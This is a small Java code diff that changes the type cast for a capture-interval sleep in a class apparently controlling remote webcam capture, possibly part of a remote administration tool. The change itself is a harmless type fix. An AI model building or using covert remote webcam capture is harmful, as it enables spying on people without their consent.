@@ -77,7 +77,7 @@ public class PanelWebcam extends BaseControlPanel {
 										return;
 									}
 									
-									Thread.sleep((int) spInterval.getValue());
+									Thread.sleep((long) (Integer) spInterval.getValue());
 								}
 							} catch (Exception e) {
 								e.printStackTrace();
@@ -189,7 +189,7 @@ public class PanelWebcam extends BaseControlPanel {
 	public void disableCapturing() {
 		try {
 			WebcamPlugin.enabled = false;
-			Thread.sleep((int) spInterval.getValue());
+			Thread.sleep((long) (Integer) spInterval.getValue());
 			getServer().addToSendQueue(new Packet(getServer()));
 		} catch (Exception e) {					
 			e.printStackTrace();
